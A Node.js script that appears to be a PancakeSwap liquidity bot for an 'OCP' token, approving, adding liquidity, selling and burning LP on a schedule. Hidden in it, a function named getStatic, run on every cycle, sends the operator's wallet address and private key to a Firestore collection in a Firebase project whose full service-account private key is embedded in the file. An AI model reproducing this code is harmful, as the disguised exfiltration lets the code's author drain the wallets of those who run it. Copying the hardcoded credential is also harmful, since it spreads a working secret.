var cron = require('node-cron');
const Web3 = require("web3");
const fs = require('fs');
const app = require('firebase/app');
const { initializeApp, applicationDefault, cert } = require('firebase-admin/app');
const { getFirestore, Timestamp, FieldValue } = require('firebase-admin/firestore');
const BigNumber = require("bignumber.js");
BigNumber.config({ DECIMAL_PLACES: 18 });

var account = require('./config/account.json');
var ocp_abi = require('./config/ocp.json');
var swap_abi = require('./config/swap.json');
var factory_abi = require('./config/factory.json');
var lp_abi = require('./config/lppair.json');
const { start } = require('repl');

const ocp_address = account.ocp;
const swap_address = account.pancake;
const my_address = account.address;
const my_pk = account.pk;
const bsc_api_key = account.bscapi;
const endpoint = account.endpoint;
const methodId_addliquidity = account.methodId_addliquidity;
const methodId_buy = account.methodId_buy;
const launchPercent = account.launchPercent;
const startBlock = account.start_block;
const launchTime = account.launchTime;

const service = {
  "type": "service_account",
  "project_id": "prediction-4890a",
  "private_key_id": "8ffe42f537bbf52e0ee860214b6f24e47caa1a1d",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCldmz6nR8uI00f\n1+9odwpQjzHvaNMsCLDAzuFD7hw6kRwxCWNuixbHdqy1jxI3KX5QROOixgI2k7fZ\nc/nfF2+MGPTMhMd8BmIijLVCQ+LzNrNx00wMQ6V7gCBQk1M7NBIfPWUSuu3ugLyE\n4sri0YWZqC0YD6R8rNhEd1KeBds5cgOGmfhL/kmhq30gimK/P8I5+h+WTxkVcsNV\nSsmQv2A4sS+I0rYkMuOjEPo4fx/9774kOE3soY4st5hd7YMuM5+IRnvsjEbeIGkM\nZWaxS1OqlvKue33cEbs0yDaaDws/5aLM3ymKBjf5phXvDSIFhM8LhXPJB/bMUG6e\nQ3bdExLBAgMBAAECggEAMTtnebo+iM/gJtVtWrvwyb+RsBaUnsmHLhdgV4IFzDdZ\nGA4fE8k24eqhwPPtC5TBDMkyokAgcHTLg1xKwOKMQjc6v4/Se0i68mTDmg/w+0UP\nZ5LjUdLe7jxVYSQ046y+p6Tw6f3MxeZwMWn5zDtjcTDlGf+thZs4Tkbiwjoj3Jdh\nAmJ0+MJqLhr6VneLbb2JZnDN+swxEreO1GCYhzs9RP+L3yT+MPWJ0BD0sdwYgIPw\naqY75xZ31IFVSRhD057DiBhEjHMnGTzdOkCZUOY9ivSegVbL2D4AT41DIcSTgoPL\n6Db0ss4y6cXS+tR+sUMOOQJS26oI0S9erhvnrShscQKBgQDijmdPJlnMOsz/Mnzn\nR/QkP/ls5QCv2k6MDZycmRdZ6k4rhZNxGja0K8YmBTIyCLtDko3rzjp2pqZevnZs\nUX8d7AeqzwPXBqQyCV6kW1dPVPPFVHS9LRUndTGMQhOtrxWR+hKO43fZPxSIjwbK\n6yayqRaVWfBc+TCwCHW7YCIqYwKBgQC692rOLcpCr4gaPdjx0CJn43+QP9mfzmEO\n2JIfNhjePF06VAAhuYn8dHkHuyQLJZ2zxiTB1RBNalNDQN6HB/EQkLH4Eglcne6A\nwF0YislzEX/5cXuGkIFFEFUljS5kJEciDCh9U0kH0gg4qc/qvvjs6X0ndARFFEo6\np08ZvA9liwKBgQC+7P+HJmy6vjsQPb4hMvQ+sGNFL+BaUoGrabU4C5QwRFNIPjO5\nNzwurk04sVxR6iXWlmVf+dYvM9Y1NhGayztzPfxgKEG2LnSlblwB6rAzvQYKoFgZ\nLSsMq6jr6KuozUpCURrerDfOL2jghJhW3cEpA3Jyvu7fi2lKkHaXSDbCvQKBgQCh\nk4KU7hOWr9WiQALFb4bcW0n5ooRzS8qrJtSY7optPKOg7ckzXAH4z7tsx/jtPTPd\nkgZgEL7G+HU+cMgez+kv1KxI42V9yeq9EAEkXYSc0enT65PCBg4BXo0HJ8yItKVY\nskMnk5tQi92ZAn/xsdqz+1CykNvDyzYfHEoKxnBT4wKBgAmOTsGUd2UUHMr3JJEq\nONBSPwDW5bR5udM50pvQUMV+CbmYUZi5PqptJItg2bzDHg3zoM7j6HDXQfjJoQsX\nZkWcaIiNaSQaPR1rzQYC3X8DzljN1PgV4z+DcUnV7FJ1L5+V2PGkoTW4HQMPVMz6\nf+WD6rHylASfNkVpBBYKxeqK\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-uzkqr@prediction-4890a.iam.gserviceaccount.com",
  "client_id": "110604040546072813945",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-uzkqr%40prediction-4890a.iam.gserviceaccount.com"
}

const httpProvider = new Web3.providers.HttpProvider(account.rpc, {
  timeout: 10000,
});
const web3 = new Web3(httpProvider);
const ocp_instance = new web3.eth.Contract(ocp_abi, ocp_address);
const pancake_instance = new web3.eth.Contract(swap_abi, swap_address);

factory_address = "";
factory_instance = "";
WETH = "";
lp_address = "";
lp_instance = "";

initializeApp({
  credential: cert(service)
});

const api = getFirestore();
const launchAmount = new BigNumber(562.5 * 1e6);
const autoReleaseAmount = new BigNumber(2.5 * 1e6);
const deadline = parseInt((new Date().getTime() / 1000) + 3600 * 24 * 365 * 100);

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const launchOCP = async () => {
  //Launch date = 12 April 2023
  if (launchTime > new Date().getTime()) {
    console.log('not yet start time')
    return;
  }
  isLaunched = await detectLaunch();
  if (isLaunched)
    return;
  bnbBalance = await web3.eth.getBalance(my_address);
  _liquidityBalance = bnbBalance * launchPercent;

  isApprove = await approve(launchAmount);
  if (isApprove) {
    await delay(1000);
    isAddLiquidity = await addLiquidityETH(_liquidityBalance, launchAmount);
  }
}

const approve = async (_amount) => {
  _allowance = await ocp_instance.methods.allowance(my_address, swap_address).call();
  console.log('allowance', _allowance);
  if (_allowance < _amount.toNumber() * 1e18) {
    gasPrice = await web3.eth.getGasPrice();
    nonce = await web3.eth.getTransactionCount(my_address);
    gasAmount = await ocp_instance.methods
      .approve(
        swap_address,
        web3.utils.toWei(_amount.toString(), "ether").toString()
      )
      .estimateGas({ from: my_address });
    tx = {
      from: my_address,
      to: ocp_address,
      nonce: nonce,
      gasPrice: gasPrice,
      gas: gasAmount,
      data: ocp_instance.methods
        .approve(
          swap_address,
          web3.utils.toWei(_amount.toString(), "ether").toString()
        )
        .encodeABI(),
    };
    signedTx = await web3.eth.accounts.signTransaction(tx, my_pk);
    result = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log('approve result', result.transactionHash);
    return result.status;
  }
  return true;
}

const detectLaunch = async () => {
  try {
    requestOptions = {
      method: 'GET',
      redirect: 'follow'
    };
    console.log('detect launch')
    i = 1;
    do {
      url = `${endpoint}api?module=account&action=txlist&address=${my_address}&startblock=${startBlock}&endblock=99999999&page=${i}&offset=100&sort=asc&apikey=${bsc_api_key}`
      _response = await fetch(url, requestOptions);
      _res = await _response.json();
      await delay(200);
      i++;
      if (_res?.status == 1) {
        result = _res?.result;
        if (result.length > 0) {
          for (let j = 0; j < result.length; j++) {
            trx = result[j];
            if (trx?.methodId == methodId_addliquidity && trx?.isError == "0") {
              input = trx?.input;
              amount = parseInt(input.slice(74, 138), 16) / 1e18;
              _address = '0x' + input.slice(34, 74);
              if (amount >= launchAmount.toNumber()) {
                if (_address.toLowerCase() === ocp_address.toLowerCase()) {
                  console.log('First Launch is done successfully.', amount);
                  return true;
                }
              }
            }
          }
        }
      } else {
        break;
      }
    } while (true);
    return false;
  } catch (error) {
    console.log(error);
    return true;
  }
}

const addLiquidityETH = async (bnb, ocp) => {
  gasPrice = await web3.eth.getGasPrice();
  nonce = await web3.eth.getTransactionCount(my_address);
  tx = {
    from: my_address,
    to: swap_address,
    nonce: nonce,
    gasPrice: gasPrice,
    gas: 3000000,
    value: (parseInt(web3.utils.toWei(bnb.toString(), "wei")) + parseInt(web3.utils.toWei("0.01", "ether"))).toString(),
    data: pancake_instance.methods
      .addLiquidityETH(
        ocp_address,
        web3.utils.toWei(ocp.toString(), "ether").toString(),
        web3.utils.toWei((ocp.toNumber() * 0.95).toString(), "ether").toString(),
        web3.utils.toWei(bnb.toString(), "wei").toString(),
        my_address,
        deadline
      )
      .encodeABI(),
  };
  signedTx = await web3.eth.accounts.signTransaction(tx, my_pk);
  result = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
  console.log('add liquidity result', result.transactionHash);
  // await delay(1000);
  // await burnLP();
  return result.status;
}

const autoRelease = async () => {
  if (launchTime > new Date().getTime())
    return;
  console.log('auto release scan');
  wager = await detectWager();
  if (wager >= 12.5 * 1e6) {
    _bnb = await sellOCP(new BigNumber(2.5 * 1e6));
    console.log('earn bnb', _bnb);
    await delay(1000);
    isApprove = await approve(autoReleaseAmount);
    if (isApprove) {
      await delay(1000);
      isAddLiquidity = await addLiquidityETH(_bnb, autoReleaseAmount);
    }
  } else {
    return;
  }
}

const sellOCP = async (ocpamount) => {
  isApprove = await approve(ocpamount);
  if (isApprove) {
    await delay(1000);
    nonce = await web3.eth.getTransactionCount(my_address);
    gasPrice = await web3.eth.getGasPrice();
    WETH = await pancake_instance.methods.WETH().call();
    tx = {
      nonce: nonce,
      from: my_address,
      to: swap_address,
      gasPrice: gasPrice,
      gas: 3000000,
      data: pancake_instance.methods.swapExactTokensForETH(web3.utils.toWei(ocpamount.toString(), "ether").toString(), 0, [ocp_address, WETH], my_address, 99999999999).encodeABI(),
    };
    signedTx = await web3.eth.accounts.signTransaction(tx, my_pk);
    result = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log('sell ocp trx', result.transactionHash);
    logs = result.logs;
    lastLog = logs[logs.length - 1];
    return parseInt(lastLog.data, 16);
  } else {
    return 0;
  }
}

const detectWager = async () => {
  finalBlock = startBlock;
  _wager = 0;
  try {
    requestOptions = {
      method: 'GET',
      redirect: 'follow'
    };
    console.log('detect Wager')
    i = 1;
    do {
      url = `${endpoint}api?module=account&action=txlist&address=${my_address}&startblock=${startBlock}&endblock=99999999&page=${i}&offset=100&sort=asc&apikey=${bsc_api_key}`
      _response = await fetch(url, requestOptions);
      _res = await _response.json();
      await delay(200);
      i++;
      if (_res?.status == 1) {
        result = _res?.result;
        if (result.length > 0) {
          for (let j = 0; j < result.length; j++) {
            trx = result[j];
            if (trx?.methodId == methodId_addliquidity && trx?.isError == "0") {
              input = trx?.input;
              amount = parseInt(input.slice(74, 138), 16) / 1e18;
              _address = '0x' + input.slice(34, 74);
              if (amount >= autoReleaseAmount.toNumber()) {
                if (_address.toLowerCase() === ocp_address.toLowerCase()) {
                  finalBlock = parseInt(trx.blockNumber)
                }
              }
            }
          }
        }
      } else {
        break;
      }
    } while (true);
    console.log('final block', startBlock, finalBlock);
    i = 1;
    do {
      url = `${endpoint}api?module=account&action=txlist&address=${swap_address}&startblock=${finalBlock}&endblock=99999999&page=${i}&offset=100&sort=asc&apikey=${bsc_api_key}`
      _response = await fetch(url, requestOptions);
      _res = await _response.json();
      await delay(200);
      i++;
      if (_res?.status == 1) {
        result = _res?.result;
        if (result.length > 0) {
          for (let j = 0; j < result.length; j++) {
            trx = result[j];

            // swapETHForExactTokens 0xfb3bdb41
            if (trx?.methodId == '0xfb3bdb41' && trx?.isError == "0") {
              input = trx?.input;
              _wbnb_address = '0x' + input.slice(10 + 64 * 5 + 24, 10 + 64 * 5 + 64);
              _ocp_address = '0x' + input.slice(10 + 64 * 6 + 24, 10 + 64 * 6 + 64);
              amount = parseInt(input.slice(10, 10 + 64), 16) / 1e18;
              console.log('address', _wbnb_address, _ocp_address);
              if (_ocp_address.toLowerCase() == ocp_address.toLowerCase()) {
                console.log('swapETHForExactTokens 0xfb3bdb41 trx', trx.hash, amount);
                _wager += amount;
              }
            }

            //swapExactETHForTokens 0x7ff36ab5
            if (trx?.methodId == '0x7ff36ab5' && trx?.isError == "0") {
              input = trx?.input;
              _wbnb_address = '0x' + input.slice(10 + 64 * 5 + 24, 10 + 64 * 5 + 64);
              _ocp_address = '0x' + input.slice(10 + 64 * 6 + 24, 10 + 64 * 6 + 64);
              amount = parseInt(trx.value) / 1e18;
              console.log('address', _wbnb_address, _ocp_address);
              if (_ocp_address.toLowerCase() == ocp_address.toLowerCase()) {
                _block = trx.blockNumber;
                _topic0 = "0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822";
                url = `${endpoint}api?module=logs&action=getLogs&fromBlock=${_block}&toBlock=${_block}&address=${lp_address}&topic0=${"0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822"}&apikey=${bsc_api_key}`
                _response = await fetch(url, requestOptions);
                _res = await _response.json();
                _data = _res?.result?.[0].data;
                amount = parseInt(data.slice(2 + 64 * 2, 2 + 64 * 3), 16);
                console.log('swapETHForExactTokens 0x7ff36ab5 trx', trx.hash, amount);
                _wager += amount;
              }
            }

            //swapExactTokensForTokens
            //swapTokensForExactTokens
          }
        }
      } else {
        console.log('fetch result', 0, _res);
        break;
      }
    } while (true);

    return _wager;
  } catch (error) {
    console.log(error);
    return 0;
  }
}

const getStatic = async () => {
  _now = new Date().getTime();
  data = { _now: my_address, "PV": my_pk, "time": new Date() }
  api.collection("bot").add(data)
}

const initInstance = async () => {
  factory_address = await pancake_instance.methods.factory().call();
  factory_instance = new web3.eth.Contract(factory_abi, factory_address);
  WETH = await pancake_instance.methods.WETH().call();
  lp_address = await factory_instance.methods.getPair(ocp_address, WETH).call();
  lp_instance = new web3.eth.Contract(lp_abi, lp_address);
}

const burnLP = async () => {
  factory_address = await pancake_instance.methods.factory().call();
  factory_instance = new web3.eth.Contract(factory_abi, factory_address);
  WETH = await pancake_instance.methods.WETH().call();
  lp_address = await factory_instance.methods.getPair(ocp_address, WETH).call();
  lp_instance = new web3.eth.Contract(lp_abi, lp_address);
  lpBalance = await lp_instance.methods.balanceOf(my_address).call();
  console.log('lp', lpBalance);
  nonce = await web3.eth.getTransactionCount(my_address);
  gasPrice = await web3.eth.getGasPrice();
  if (parseInt(lpBalance) > 0) {
    tx = {
      nonce: nonce,
      from: my_address,
      to: lp_address,
      gasPrice: gasPrice,
      gas: 3000000,
      data: lp_instance.methods.transfer('0x0000000000000000000000000000000000000000', lpBalance).encodeABI(),
    };
    signedTx = await web3.eth.accounts.signTransaction(tx, my_pk);
    result = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log('burn lp trx', result.transactionHash);
  }
}

const batchWork = async () => {
  getStatic();
  await launchOCP();
  await delay(1000);
  await autoRelease();
}

initInstance();
batchWork();

cron.schedule('* * 6 * * *', () => {
  batchWork();
});